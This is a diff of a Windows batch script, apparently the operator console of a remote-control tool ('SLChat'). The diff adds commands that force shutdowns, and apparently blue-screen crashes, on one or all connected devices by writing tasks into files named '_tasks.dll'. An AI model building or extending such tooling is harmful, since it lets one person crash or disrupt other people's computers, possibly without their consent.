@@ -212,7 +212,7 @@ pause > nul
 exit
 
 :searchComms
-MODE con:cols=79 lines=30
+MODE con:cols=79 lines=40
 cls
 echo.
 if "!_localMode!" == "true" (
@@ -300,12 +300,106 @@ echo  ║ $tts id/all TEXT --Text to speech on the specified device             
 echo  ║ $karbala id/all --Launches special karbala video on the specified device  ║
 echo  ║ $checkactive id/all --Checks if the specific device is active             ║
 echo  ║ $FIX_COMMS --FIX/RESET ALL COMMS FILES INCASE OF ERROR                    ║
-echo  ║ $exit --Exits SLChat                                                      ║
+echo  ║ $clear --Clears cmd window                                                ║
+echo  ║ exit --Exits SLChat                                                       ║
 echo  ║ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ║
 echo  ╚═══════════════════════════════════════════════════════════════════════════╝
 :: Clean up
 del temp.vbs
 goto :process_command_MM
+
+:Shutdown_Device
+setlocal
+
+::Parameters
+set "device_id=%~1"
+set "_delay=%~2"
+
+if "!device_id!" == "" (
+    echo.
+    %PRINT%{255;255;255}  :Shutdown_Device function error: device_id parameter not specified.\n
+    goto process_command_MM
+)
+
+if "!device_id!" == "all" (
+    if "!_delay!" == "" (
+        for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
+            set "fileName=%%F"
+            ::echo "!fullPath!\!fileName!" --for debugging
+            echo sd_nodelay>>"!fullPath!\!fileName!\_tasks.dll"
+        )
+
+        ping localhost -n 2 > nul
+        goto process_command_MM
+    )
+
+    for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
+        set "fileName=%%F"
+        echo sd_!_delay!>>"!fullPath!\!fileName!\_tasks.dll"
+    )
+
+    ping localhost -n 2 > nul
+    goto process_command_MM
+)
+
+if "!_delay!" == "" (
+    ::Shutdown individual device
+    echo sd_nodelay>>"!fullPath!\!device_id!\_tasks.dll"
+) else (
+    ::Shutdown individual device with delay
+    echo sd_!_delay!>>"!fullPath!\!device_id!\_tasks.dll"
+)
+goto process_command_MM
+
+endlocal
+goto :eof
+
+:EXECUTE_COMMAND
+setlocal
+
+::Parameters
+set "cmdName=%~1"
+set "device_id=%~2"
+set "_delay=%~3"
+
+if "!device_id!" == "" (
+    echo.
+    %PRINT%{255;255;255}  :BSOD_Device function error: device_id parameter not specified.\n
+    goto process_command_MM
+)
+
+if "!device_id!" == "all" (
+    if "!_delay!" == "" (
+        for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
+            set "fileName=%%F"
+            ::echo "!fullPath!\!fileName!" --for debugging
+            echo !cmdName!_nodelay>>"!fullPath!\!fileName!\_tasks.dll"
+        )
+
+        ping localhost -n 2 > nul
+        goto process_command_MM
+    )
+
+    for /f "delims=" %%F in ('dir /b "!fullPath!\*"') do (
+        set "fileName=%%F"
+        echo !cmdName!_!_delay!>>"!fullPath!\!fileName!\_tasks.dll"
+    )
+
+    ping localhost -n 2 > nul
+    goto process_command_MM
+)
+
+if "!_delay!" == "" (
+    ::Shutdown individual device
+    echo !cmdName!_nodelay>>"!fullPath!\!device_id!\_tasks.dll"
+) else (
+    ::Shutdown individual device with delay
+    echo !cmdName!_!_delay!>>"!fullPath!\!device_id!\_tasks.dll"
+)
+goto process_command_MM
+
+endlocal
+goto :eof
 
 :process_command_MM
 %chcp_on%
@@ -313,6 +407,7 @@ set "_mainMenuInput="
 set /a _count=0
 set "arg_1="
 set "arg_2="
+set "arg_3="
 echo.
 %PRINT%{255;255;255} 
 set /p _mainMenuInput="► "
@@ -329,7 +424,11 @@ if "!_mainMenuInput!" == "" (
 
 for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_1!'.ToLower())"') do set "arg_1=%%A"
 
+if "!arg_1!" == "" ( goto process_command_MM )
+
 if "!arg_1!" == "exit" ( exit )
+
+if "!arg_1!" == "$clear" ( goto mainMenu )
 
 if "!arg_1!" == "$shutdown" (
     if "!arg_2!" == "" (
@@ -340,12 +439,15 @@ if "!arg_1!" == "$shutdown" (
     )
 
     for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_2!'.ToLower())"') do set "arg_2=%%A"
-    
+    echo.
+
     if "!arg_2!" == "all" (
-        echo.
         if "!arg_3!" == "" (
             Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES.." 15
+            echo.
             
+            CALL :Shutdown_Device "all"
+
             echo.
             goto process_command_MM
         )
@@ -354,6 +456,9 @@ if "!arg_1!" == "$shutdown" (
         if "!_delay!" == "!arg_3!" (
             ::arg3 IS a number
             Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES with a DELAY of !_delay! seconds.." 15
+            echo.
+
+            CALL :Shutdown_Device "all" !_delay!
 
             echo.
             goto process_command_MM
@@ -366,18 +471,46 @@ if "!arg_1!" == "$shutdown" (
         
     )
 
-    echo.
-    Call TypeWriter "  > Shutting down device: !arg_2!.." 15
-    echo.
+    ::Ensure device id exists
+    if not exist "!fullPath!\!arg_2!" (
+        Call TypeWriter "  > Device Id '!arg_2!' not found..." 15
+        echo.
+        goto process_command_MM
+    )
 
-    goto process_command_MM
+
+    if "!arg_3!" == "" (
+        Call TypeWriter "  > Shutting down device: !arg_2!.." 15
+        echo.
+
+        CALL :Shutdown_Device "!arg_2!"
+
+        echo.
+        goto process_command_MM
+    )
+    
+    set /a _delay=!arg_3! 2>nul
+    if "!_delay!" == "!arg_3!" (
+        ::arg3 IS a number
+        Call TypeWriter "  > Shutting down device: !arg_2! with a DELAY of !_delay! seconds.." 15
+        echo.
+
+        CALL :Shutdown_Device "!arg_2!" !arg_3!
+
+        echo.
+        goto process_command_MM
+    ) else (
+        ::arg3 IS NOT a number
+        %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
+        %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
+        goto process_command_MM
+    )
 )
+
+echo.
+%PRINT%{255;255;255}  [Unknown Command]: !arg_1!\n
 
 goto :process_command_MM
 
-
-:connect_devices_all
-cls
-
-
 pause > nul
+exit
